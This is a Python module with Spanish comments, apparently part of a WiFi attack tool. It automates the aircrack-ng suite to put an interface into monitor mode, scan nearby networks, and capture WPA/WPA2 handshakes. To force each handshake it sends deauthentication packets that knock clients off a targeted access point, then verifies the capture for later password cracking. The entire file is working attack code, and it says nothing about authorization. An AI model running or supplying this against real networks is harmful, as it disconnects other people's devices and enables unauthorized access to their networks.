"""
Módulo de captura WiFi y manejo de redes
Maneja: detección de redes, cambio a monitor, captura de handshakes
"""
import subprocess
import json
import os
import re
import time
import signal
from datetime import datetime
import config
from utils.logger import get_logger

logger = get_logger(__name__)


class WiFiCapture:
    """Gestor de captura de redes WiFi y handshakes WPA/WPA2"""

    def __init__(self, interface=None):
        """
        Inicializa el capturador WiFi
        
        Args:
            interface: Interfaz WiFi a usar (ej: wlan0)
        """
        self.interface = interface or config.WLAN_INTERFACE
        self.monitor_interface = None
        self.networks = []
        self.target_network = None
        self.handshake_file = None
        self.process = None

    def check_root_privileges(self):
        """Verifica si se ejecuta con privilegios de root"""
        if os.geteuid() != 0:
            logger.error("Esta herramienta requiere privilegios de root (sudo)")
            raise PermissionError("Se requieren privilegios de root para capturar WiFi")

    def check_aircrack_ng(self):
        """Verifica que aircrack-ng esté instalado"""
        required_tools = {
            'aircrack-ng': config.AIRCRACK_NG_PATH,
            'airodump-ng': config.AIRODUMP_NG_PATH,
            'airmon-ng': config.AIRMON_NG_PATH,
            'aireplay-ng': config.AIREPLAY_NG_PATH,
        }

        for tool_name, tool_path in required_tools.items():
            if not os.path.exists(tool_path):
                logger.error(
                    f"{tool_name} no encontrado en {tool_path}. "
                    f"Instala: sudo apt-get install aircrack-ng"
                )
                raise FileNotFoundError(f"{tool_name} no disponible")

        logger.info("aircrack-ng suite verificada correctamente")

    def list_interfaces(self):
        """
        Lista todas las interfaces WiFi disponibles
        
        Returns:
            list: Lista de interfaces disponibles
        """
        try:
            result = subprocess.run(
                ['iwconfig'],
                capture_output=True,
                text=True,
                timeout=10
            )

            interfaces = []
            for line in result.stdout.split('\n'):
                if 'ESSID' in line or 'IEEE 802.11' in line:
                    interface = line.split()[0]
                    if interface and interface not in interfaces:
                        interfaces.append(interface)

            logger.info(f"Interfaces encontradas: {interfaces}")
            return interfaces

        except Exception as e:
            logger.error(f"Error listando interfaces: {e}")
            return []

    def enable_monitor_mode(self):
        """
        Habilita el modo monitor en la interfaz
        
        Returns:
            str: Nombre de la interfaz en modo monitor (ej: wlan0mon)
        """
        try:
            logger.info(f"Habilitando modo monitor en {self.interface}...")

            # Detener Network Manager
            subprocess.run(['systemctl', 'stop', 'NetworkManager'], capture_output=True)
            time.sleep(1)

            # Ejecutar airmon-ng check kill
            subprocess.run(
                ['airmon-ng', 'check', 'kill'],
                capture_output=True
            )
            time.sleep(1)

            # Habilitar modo monitor
            result = subprocess.run(
                ['airmon-ng', 'start', self.interface],
                capture_output=True,
                text=True,
                timeout=10
            )

            # Detectar la interfaz en modo monitor
            if "monitor mode enabled" in result.stdout.lower():
                # El nombre es generalmente interface + "mon"
                self.monitor_interface = f"{self.interface}mon"
            else:
                # Alternativa: buscar en la salida
                match = re.search(r'\((\w+)\)', result.stdout)
                if match:
                    self.monitor_interface = match.group(1)
                else:
                    self.monitor_interface = f"{self.interface}mon"

            logger.info(f"Modo monitor habilitado: {self.monitor_interface}")
            return self.monitor_interface

        except Exception as e:
            logger.error(f"Error habilitando modo monitor: {e}")
            raise

    def disable_monitor_mode(self):
        """Deshabilita el modo monitor y restaura la interfaz"""
        try:
            if self.monitor_interface:
                logger.info(f"Deshabilitando modo monitor...")
                subprocess.run(
                    ['airmon-ng', 'stop', self.monitor_interface],
                    capture_output=True,
                    timeout=10
                )
                time.sleep(1)

                # Reiniciar NetworkManager
                subprocess.run(
                    ['systemctl', 'start', 'NetworkManager'],
                    capture_output=True
                )
                logger.info("Modo normal restaurado")

        except Exception as e:
            logger.warning(f"Error deshabilitando modo monitor: {e}")

    def scan_networks(self, timeout=15):
        """
        Escanea redes WiFi disponibles
        
        Args:
            timeout: Segundos para escanear
            
        Returns:
            list: Lista de redes encontradas
        """
        if not self.monitor_interface:
            self.enable_monitor_mode()

        try:
            logger.info(f"Escaneando redes durante {timeout} segundos...")

            # Crear archivo temporal para la captura
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = os.path.join(config.CAPTURE_DIR, f"scan_{timestamp}")

            # Ejecutar airodump-ng
            cmd = [
                'airodump-ng',
                '--write', output_file,
                '--output-format', 'csv',
                self.monitor_interface
            ]

            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Esperar el timeout
            time.sleep(timeout)
            process.terminate()
            process.wait(timeout=5)

            # Leer el archivo CSV
            csv_file = output_file + '-01.csv'
            if os.path.exists(csv_file):
                return self._parse_airodump_csv(csv_file)
            else:
                logger.warning("No se pudo generar archivo de captura")
                return []

        except Exception as e:
            logger.error(f"Error escaneando redes: {e}")
            return []

    def _parse_airodump_csv(self, csv_file):
        """Parsea el archivo CSV de airodump-ng"""
        networks = []

        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()

            # Buscar la sección de redes (después de línea en blanco)
            in_networks = False
            for line in lines:
                if line.strip() == '':
                    in_networks = True
                    continue

                if not in_networks or line.startswith('BSSID'):
                    continue

                parts = [p.strip() for p in line.split(',')]
                if len(parts) < 14 or parts[0].count(':') != 5:  # BSSID format
                    continue

                network = {
                    'BSSID': parts[0],
                    'Power': int(parts[8]) if parts[8] else -100,
                    'Beacons': int(parts[9]) if parts[9] else 0,
                    'Data': int(parts[10]) if parts[10] else 0,
                    'ESSID': parts[13] if len(parts) > 13 else 'HIDDEN',
                    'Encryption': self._parse_encryption(line)
                }

                if network['ESSID'] and network['ESSID'] != 'HIDDEN':
                    networks.append(network)

            self.networks = networks
            return networks

        except Exception as e:
            logger.error(f"Error parseando CSV: {e}")
            return []

    @staticmethod
    def _parse_encryption(line):
        """Extrae información de encriptación de línea airodump"""
        if 'WPA2' in line:
            return 'WPA2'
        elif 'WPA' in line:
            return 'WPA'
        elif 'WEP' in line:
            return 'WEP'
        else:
            return 'UNKNOWN'

    def capture_handshake(self, essid, bssid, timeout=config.CAPTURE_TIMEOUT):
        """
        Captura el handshake WPA/WPA2 de una red
        
        Args:
            essid: Nombre de la red
            bssid: Dirección MAC de la red
            timeout: Segundos para capturar
            
        Returns:
            str: Ruta del archivo con el handshake
        """
        if not self.monitor_interface:
            self.enable_monitor_mode()

        try:
            logger.info(f"Iniciando captura de handshake para {essid} ({bssid})...")

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = os.path.join(
                config.HANDSHAKE_DIR,
                f"handshake_{essid}_{timestamp}"
            )

            # Iniciar captura con airodump-ng
            capture_cmd = [
                'airodump-ng',
                '--bssid', bssid,
                '--essid', essid,
                '--write', output_file,
                '--output-format', 'pcap',
                self.monitor_interface
            ]

            capture_process = subprocess.Popen(
                capture_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            # Esperar un poco antes de enviar deauth
            time.sleep(5)

            # Enviar paquetes de desautenticación para forzar el handshake
            logger.info(f"Enviando {config.DEAUTH_PACKETS} paquetes de desautenticación...")
            deauth_cmd = [
                'aireplay-ng',
                '--deauth', str(config.DEAUTH_PACKETS),
                '-a', bssid,
                self.monitor_interface
            ]

            try:
                subprocess.run(deauth_cmd, capture_output=True, timeout=10)
            except Exception as e:
                logger.warning(f"Error enviando deauth: {e}")

            # Continuar capturando
            start_time = time.time()
            while time.time() - start_time < timeout:
                # Verificar si se capturó el handshake
                pcap_file = output_file + '-01.pcap'
                if os.path.exists(pcap_file) and os.path.getsize(pcap_file) > 0:
                    logger.info(f"Verificando handshake en {pcap_file}...")
                    if self._verify_handshake(pcap_file):
                        logger.info("¡Handshake capturado exitosamente!")
                        capture_process.terminate()
                        self.handshake_file = pcap_file
                        return pcap_file

                time.sleep(1)

            logger.warning(f"Timeout capturando handshake después de {timeout} segundos")
            capture_process.terminate()
            return None

        except Exception as e:
            logger.error(f"Error capturando handshake: {e}")
            return None

    def _verify_handshake(self, pcap_file):
        """
        Verifica si el archivo PCAP contiene un handshake completo
        
        Args:
            pcap_file: Ruta del archivo PCAP
            
        Returns:
            bool: True si contiene handshake válido
        """
        try:
            result = subprocess.run(
                ['aircrack-ng', pcap_file, '-J', '/tmp/dummy.csv'],
                capture_output=True,
                text=True,
                timeout=10
            )

            # Si aircrack detecta un handshake válido lo indicará
            return 'No valid WPA handshakes found' not in result.stdout

        except Exception as e:
            logger.debug(f"Error verificando handshake: {e}")
            return False

    def cleanup(self):
        """Limpia recursos y restaura la interfaz"""
        try:
            if self.process:
                self.process.terminate()
        except:
            pass

        self.disable_monitor_mode()
